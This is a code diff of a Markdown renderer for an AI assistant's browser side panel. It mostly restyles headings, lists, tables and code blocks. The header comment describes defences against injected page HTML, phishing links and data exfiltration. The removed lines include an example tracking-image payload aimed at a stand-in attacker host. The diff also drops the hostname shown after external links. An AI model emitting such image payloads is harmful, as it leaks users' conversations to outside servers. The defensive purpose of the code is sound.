@@ -1,23 +1,21 @@
 /**
  * 助手回复的 Markdown 渲染。
  *
- * 三条安全约束，每条都对应一个真实攻击面：
+ * 组件 className **逐字**对齐官方 1.0.81 sidepanel markdown map
+ *（`h1:k(1,"text-text-100 mt-3 …")` / `ul` list-disc pl-8 / `oC.code` 等）。
+ * 外层再包 `claude-response` + `font-claude-response text-sm leading-[1.65rem]…`
+ *（见 Message.tsx），字体族由官方 CSS 的 `.claude-response h*` 补齐。
  *
- * 1. **不开 rehype-raw。** 模型的输出里可能夹带页面上抄来的 HTML；
- *    允许原始 HTML = 允许页面往侧栏注入内容。侧栏是特权上下文
- *    （能读 chrome.storage、能调 chrome.debugger），绝不能渲染任意 HTML。
- *
- * 2. **链接一律 target=_blank + rel=noopener noreferrer**，并且**不自动跳转**。
- *    模型不能靠输出一个 markdown 链接就让用户点进钓鱼站 —— 至少 hostname
- *    要看得见，所以外链后面缀上域名。
- *
- * 3. **图片不渲染成 <img>。** 一个 `![](https://attacker/track?data=...)`
- *    会在侧栏里自动发出请求，把对话内容外带出去。这里降级成纯文本链接。
+ * 安全约束：
+ * 1. **不开 rehype-raw** — 页面抄来的 HTML 绝不能进特权侧栏。
+ * 2. **链接** 只放行 http(s)，`target=_blank` + `rel=noopener noreferrer`。
+ * 3. **图片** 不渲染成 `<img>`（防外带追踪像素），降级纯文本。
  */
 
-import { memo } from 'react';
+import { memo, type ReactNode } from 'react';
 import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
+import { cn } from './cn';
 
 function hostOf(href: string): string {
   try {
@@ -27,16 +25,103 @@ function hostOf(href: string): string {
   }
 }
 
+/**
+ * Official heading ladder (response mode, heading offset 0):
+ *   h1  text-text-100 mt-3 -mb-1 text-[1.375rem] font-bold
+ *   h2  text-text-100 mt-3 -mb-1 text-[1.125rem] font-bold
+ *   h3/h4  text-text-100 mt-2 -mb-1 text-base font-bold
+ *   h5  text-text-100 mt-2 -mb-1 text-sm font-bold
+ *   h6  text-text-100 mt-2 -mb-1 text-sm font-semibold
+ */
+const HEADING: Record<1 | 2 | 3 | 4 | 5 | 6, string> = {
+  1: 'text-text-100 mt-3 -mb-1 text-[1.375rem] font-bold',
+  2: 'text-text-100 mt-3 -mb-1 text-[1.125rem] font-bold',
+  3: 'text-text-100 mt-2 -mb-1 text-base font-bold',
+  4: 'text-text-100 mt-2 -mb-1 text-base font-bold',
+  5: 'text-text-100 mt-2 -mb-1 text-sm font-bold',
+  6: 'text-text-100 mt-2 -mb-1 text-sm font-semibold',
+};
+
+function heading(level: 1 | 2 | 3 | 4 | 5 | 6) {
+  const Tag = `h${level}` as 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6';
+  const className = HEADING[level];
+  return function MdHeading({ children }: { children?: ReactNode }) {
+    return <Tag className={className}>{children}</Tag>;
+  };
+}
+
 const COMPONENTS: Components = {
+  h1: heading(1),
+  h2: heading(2),
+  h3: heading(3),
+  h4: heading(4),
+  h5: heading(5),
+  h6: heading(6),
+
+  // Official response override on oC.p: break-words whitespace-normal
+  // (parent Message also applies [&_p]:!text-sm [&_p]:text-text-100)
+  p({ children }) {
+    return <p className="break-words whitespace-normal">{children}</p>;
+  },
+
+  // Official response ul/ol (overrides simpler oC defaults):
+  //   list-disc|decimal flex flex-col gap-1 pl-8 mb-3 + nested tweaks
+  ul({ children }) {
+    return (
+      <ul
+        className={cn(
+          '[li_&]:mb-0 [li_&]:mt-1 [li_&]:gap-1',
+          '[&:not(:last-child)_ul]:pb-1 [&:not(:last-child)_ol]:pb-1',
+          'list-disc flex flex-col gap-1 pl-8 mb-3',
+        )}
+      >
+        {children}
+      </ul>
+    );
+  },
+
+  ol({ children }) {
+    return (
+      <ol
+        className={cn(
+          '[li_&]:mb-0 [li_&]:mt-1 [li_&]:gap-1',
+          '[&:not(:last-child)_ul]:pb-1 [&:not(:last-child)_ol]:pb-1',
+          'list-decimal flex flex-col gap-1 pl-8 mb-3',
+        )}
+      >
+        {children}
+      </ol>
+    );
+  },
+
+  li({ children }) {
+    return (
+      <li className="whitespace-normal break-words pl-2">{children}</li>
+    );
+  },
+
+  // Official response blockquote (richer than oC.blockQuote)
+  blockquote({ children }) {
+    return (
+      <blockquote className="ml-2 border-l-4 border-[hsl(var(--border-300)/0.1)] pl-4 text-text-300">
+        {children}
+      </blockquote>
+    );
+  },
+
+  // Official link: underline underline-offset-2 decoration-1 decoration-current/40 …
   a({ href, children }) {
     const url = typeof href === 'string' ? href : '';
-    const host = hostOf(url);
-    // 只放行 http(s)。javascript: / data: 直接降级成文本。
     if (!/^https?:\/\//i.test(url)) return <span>{children}</span>;
     return (
-      <a href={url} target="_blank" rel="noopener noreferrer" title={url}>
+      <a
+        href={url}
+        target="_blank"
+        rel="noopener noreferrer"
+        title={url}
+        className="underline underline-offset-2 decoration-1 decoration-current/40 hover:decoration-current focus:decoration-current"
+      >
         {children}
-        {host ? <span className="text-text-400"> ({host})</span> : null}
       </a>
     );
   },
@@ -51,32 +136,83 @@ const COMPONENTS: Components = {
     );
   },
 
+  // Block fence: keep a simple official-adjacent chrome (no mermaid / copy header).
   pre({ children }) {
     return (
-      <pre className="my-2 overflow-x-auto rounded-lg border-[0.5px] border-border-300 bg-bg-200 p-2.5">
+      <pre className="my-2 overflow-x-auto rounded-lg border-[0.5px] border-border-300 bg-bg-200 p-2.5 text-[0.813rem] leading-[1.5]">
         {children}
       </pre>
     );
   },
 
+  // Official oC.code: bg-text-200/5 border border-0.5 border-border-300 …
+  // Block code sits under <pre><code class="language-…"> — skip chip chrome there.
   code({ className, children }) {
-    // react-markdown 里 block code 是 <pre><code class="language-x">，
-    // inline code 没有 className。靠这个区分，比看 `inline` prop 可靠
-    // （react-markdown 10 已经不传 inline 了）。
-    const isBlock = typeof className === 'string' && className.startsWith('language-');
-    if (isBlock) return <code className={className}>{children}</code>;
+    const isBlock =
+      typeof className === 'string' && className.startsWith('language-');
+    if (isBlock) {
+      return (
+        <code className={cn('font-mono whitespace-pre-wrap', className)}>
+          {children}
+        </code>
+      );
+    }
     return (
-      <code className="rounded bg-bg-200 px-1 py-0.5 text-[0.8125rem] text-text-200">
+      <code
+        className={cn(
+          'bg-text-200/5 border border-[0.5px] border-border-300 text-danger-000',
+          'whitespace-pre-wrap rounded-[0.4rem] px-1 py-px text-[0.9rem]',
+          'font-mono',
+          className,
+        )}
+      >
         {children}
       </code>
     );
   },
 
+  strong({ children }) {
+    return <strong className="font-semibold">{children}</strong>;
+  },
+
+  em({ children }) {
+    return <em className="italic">{children}</em>;
+  },
+
+  hr() {
+    return <hr className="border-border-200 border-t-[0.5px] my-3 mx-1.5" />;
+  },
+
   table({ children }) {
     return (
-      <div className="my-2 overflow-x-auto">
-        <table>{children}</table>
+      <div className="overflow-x-auto w-full px-2 mb-6">
+        <table className="min-w-full border-collapse text-sm leading-[1.7] whitespace-normal">
+          {children}
+        </table>
       </div>
+    );
+  },
+
+  thead({ children }) {
+    return <thead className="text-left">{children}</thead>;
+  },
+
+  th({ children }) {
+    return (
+      <th
+        scope="col"
+        className="text-text-100 border-b-[0.5px] border-[hsl(var(--border-300)/0.6)] py-2 pr-4 align-top font-bold"
+      >
+        {children}
+      </th>
+    );
+  },
+
+  td({ children }) {
+    return (
+      <td className="border-b-[0.5px] border-[hsl(var(--border-300)/0.3)] py-2 pr-4 align-top">
+        {children}
+      </td>
     );
   },
 };
